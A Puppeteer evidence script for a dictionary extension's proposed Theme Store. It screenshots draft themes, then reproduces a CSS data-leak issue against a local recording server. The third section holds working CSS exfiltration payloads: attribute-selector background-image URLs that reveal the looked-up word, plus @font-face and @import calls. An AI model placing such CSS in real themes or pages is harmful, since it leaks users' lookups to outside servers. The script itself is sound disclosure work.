// Evidence for the Theme Store issue. Not part of the repository.
import { createRequire } from "node:module";
import { mkdirSync, readFileSync, writeFileSync, rmSync } from "node:fs";
import { resolve } from "node:path";
import { homedir } from "node:os";
import { createServer } from "node:http";

const require = createRequire(import.meta.url);
const puppeteer = require(require.resolve("puppeteer-core", { paths: [resolve(homedir(), ".cache/hachidori-e2e")] }));

const ROOT = process.env.HACHIDORI_ROOT;
const OUT = process.env.EVIDENCE_OUT;
const CHROME = resolve(homedir(), ".cache/hachidori-browsers/chrome/linux-152.0.7977.75/chrome-linux64/chrome");
const EXTENSION = resolve(ROOT, "extension");
const PROFILE = "/tmp/theme-store-profile";
rmSync(PROFILE, { recursive: true, force: true });
mkdirSync(PROFILE, { recursive: true });
mkdirSync(OUT, { recursive: true });

const themes = {
  nazeka: readFileSync("/tmp/theme-store/themes/nazeka/theme.css", "utf8"),
  rikaikun: readFileSync("/tmp/theme-store/themes/rikaikun/theme.css", "utf8"),
};
const report = { chrome: null, extensionVersion: JSON.parse(readFileSync(resolve(EXTENSION, "manifest.json"), "utf8")).version, previews: {}, exfiltration: {} };

// --- local server that records every request (the "attacker" endpoint) ---
const hits = [];
const server = createServer((req, res) => {
  hits.push({ url: req.url, referer: req.headers.referer ?? null, at: Date.now() });
  if (req.url === "/page.html") {
    res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
    res.end("<!doctype html><meta charset=utf-8><title>host page</title><p lang=ja>食べる</p><div id=host></div>");
    return;
  }
  if (req.url.startsWith("/remote.css")) {
    res.writeHead(200, { "content-type": "text/css" });
    res.end(".gsm-hoshidicts-popup{outline:3px solid red}");
    return;
  }
  res.writeHead(200, { "content-type": "image/gif" });
  res.end(Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"));
});
await new Promise(resolve => server.listen(0, "127.0.0.1", resolve));
const PORT = server.address().port;

const browser = await puppeteer.launch({
  executablePath: CHROME,
  enableExtensions: true,
  headless: true,
  userDataDir: PROFILE,
  args: ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage", "--disable-audio-output",
    `--disable-extensions-except=${EXTENSION}`, `--load-extension=${EXTENSION}`, "--lang=en-GB"],
});
try {
  report.chrome = await browser.version();
  const worker = await browser.waitForTarget(t => t.type() === "service_worker" && t.url().endsWith("/background.js"), { timeout: 30_000 });
  const extensionId = new URL(worker.url()).host;

  // ---------- 1. Current Settings → Design (where the Theme Store card would live) ----------
  const settings = await browser.newPage();
  await settings.setViewport({ width: 1440, height: 1000, deviceScaleFactor: 1 });
  await settings.goto(`chrome-extension://${extensionId}/settings.html#design`, { waitUntil: "load" });
  await settings.waitForFunction(() => document.getElementById("opt-popup-theme")?.options.length > 0, { timeout: 20_000 });
  await settings.waitForFunction(() => document.getElementById("design-preview")?.contentWindow?.HDDesignPreview, { timeout: 20_000 });
  await new Promise(r => setTimeout(r, 1200));
  await settings.screenshot({ path: resolve(OUT, "01-settings-design-today.png") });
  report.settingsThemeOptions = await settings.evaluate(() =>
    [...document.getElementById("opt-popup-theme").options].map(o => o.value));
  await settings.close();

  // ---------- 2. Draft themes through the production renderer (design-preview.html) ----------
  const page = await browser.newPage();
  await page.setViewport({ width: 900, height: 620, deviceScaleFactor: 2 });
  await page.goto(`chrome-extension://${extensionId}/design-preview.html`, { waitUntil: "load" });
  await page.waitForFunction(() => window.HDDesignPreview && window.HDReaderOptions, { timeout: 20_000 });

  async function render(name, skin, css, popupTheme = "default") {
    await page.evaluate(({ skin, css, popupTheme, revision }) => {
      const host = document.getElementById("preview-host");
      if (skin) host.dataset.hoshidictsSkin = skin; else delete host.dataset.hoshidictsSkin;
      const options = { ...HDReaderOptions.DEFAULT_OPTIONS, popupTheme, customPopupCss: css,
        popupWidthPx: 560, popupHeightPx: 420, popupOpacityPercent: 100 };
      HDDesignPreview.update(options, { revision, dictionaries: [], groups: [] });
    }, { skin, css, popupTheme, revision: Object.keys(report.previews).length + 1 });
    await page.evaluate(() => new Promise(r => requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(r, 400)))));
    const metrics = await page.evaluate(() => {
      const host = document.getElementById("preview-host");
      const popup = host.shadowRoot.querySelector(".gsm-hoshidicts-popup");
      const cs = getComputedStyle(popup);
      const expression = host.shadowRoot.querySelector(".gsm-hoshidicts-expression");
      const rt = host.shadowRoot.querySelector(".gsm-hoshidicts-expression rt");
      const card = host.shadowRoot.querySelector(".gsm-hoshidicts-glossary-card");
      const title = host.shadowRoot.querySelector(".gsm-hoshidicts-glossary-card-title");
      const content = host.shadowRoot.querySelector(".gsm-hoshidicts-glossary-content");
      const rect = popup.getBoundingClientRect();
      const pick = (el, props) => el ? Object.fromEntries(props.map(p => [p, getComputedStyle(el)[p]])) : null;
      return {
        rect: { x: rect.x, y: rect.y, width: rect.width, height: rect.height },
        theme: host.dataset.hoshidictsTheme, skin: host.dataset.hoshidictsSkin ?? null,
        adoptedSheets: host.shadowRoot.adoptedStyleSheets.length,
        popup: pick(popup, ["backgroundColor", "color", "borderRadius", "fontFamily", "fontSize", "boxShadow", "borderTopColor"]),
        expression: pick(expression, ["fontSize", "color"]),
        reading: pick(rt, ["fontSize", "color"]),
        card: pick(card, ["backgroundColor", "borderTopWidth", "borderRadius", "padding"]),
        cardTitle: pick(title, ["backgroundColor", "color", "fontSize"]),
        content: pick(content, ["fontSize"]),
        paletteBase100: getComputedStyle(host).getPropertyValue("--hoshidicts-palette-base-100").trim(),
      };
    });
    const pad = 24;
    const clip = { x: Math.max(0, metrics.rect.x - pad), y: Math.max(0, metrics.rect.y - pad),
      width: metrics.rect.width + pad * 2, height: metrics.rect.height + pad * 2 };
    await page.screenshot({ path: resolve(OUT, `${name}.png`), clip });
    report.previews[name] = metrics;
  }

  await render("02-preview-default-today", null, "");
  await render("03-preview-nazeka-draft", "nazeka", themes.nazeka);
  await render("04-preview-rikaikun-draft", "rikaikun", themes.rikaikun);
  await page.close();

  // ---------- 3. Controlled reproduction: CSS in a shadow-root adopted sheet can exfiltrate ----------
  // Mirrors createCustomPopupStyle (extension/render/popup.js:42-60): a constructed
  // CSSStyleSheet, replaceSync(css), appended to shadow.adoptedStyleSheets.
  const victim = await browser.newPage();
  await victim.goto(`http://127.0.0.1:${PORT}/page.html`, { waitUntil: "load" });
  const before = hits.length;
  const result = await victim.evaluate(async (port) => {
    const host = document.getElementById("host");
    const shadow = host.attachShadow({ mode: "open" });
    const popup = document.createElement("div");
    popup.className = "gsm-hoshidicts-popup";
    const entry = document.createElement("article");
    entry.className = "gsm-hoshidicts-entry";
    entry.dataset.expression = "食べる";          // popup.js:3365 sets this on every entry
    entry.textContent = "食べる";
    popup.append(entry);
    shadow.append(popup);
    const out = {};
    // (a) attribute-selector probe: fires only when the looked-up word starts with 食
    const sheet = new CSSStyleSheet();
    sheet.replaceSync(`
      .gsm-hoshidicts-entry[data-expression^="食"] { background-image: url("http://127.0.0.1:${port}/leak?expression-starts-with=%E9%A3%9F"); }
      .gsm-hoshidicts-entry[data-expression^="犬"] { background-image: url("http://127.0.0.1:${port}/leak?expression-starts-with=%E7%8A%AC"); }
      .gsm-hoshidicts-popup { font-family: "Leak Font"; }
      @font-face { font-family: "Leak Font"; src: url("http://127.0.0.1:${port}/font.woff2"); }
    `);
    shadow.adoptedStyleSheets = [...shadow.adoptedStyleSheets, sheet];
    // (b) @import inside a constructed sheet
    try {
      const imported = new CSSStyleSheet();
      imported.replaceSync(`@import url("http://127.0.0.1:${port}/remote.css?via=constructed");`);
      shadow.adoptedStyleSheets = [...shadow.adoptedStyleSheets, imported];
      out.constructedImportRules = imported.cssRules.length;
    } catch (error) { out.constructedImportError = String(error); }
    // (c) @import inside a <style> element in the shadow root (what a naive engine might do)
    const style = document.createElement("style");
    style.textContent = `@import url("http://127.0.0.1:${port}/remote.css?via=style-element");`;
    shadow.append(style);
    await new Promise(r => setTimeout(r, 1500));
    out.popupOutline = getComputedStyle(popup).outlineColor;
    return out;
  }, PORT);
  await new Promise(r => setTimeout(r, 800));
  report.exfiltration = { ...result, requestsReceived: hits.slice(before).map(h => h.url) };
  await victim.close();
} finally {
  await browser.close();
  server.close();
}
writeFileSync(resolve(OUT, "evidence.json"), JSON.stringify(report, null, 2));
console.log(JSON.stringify(report, null, 2));
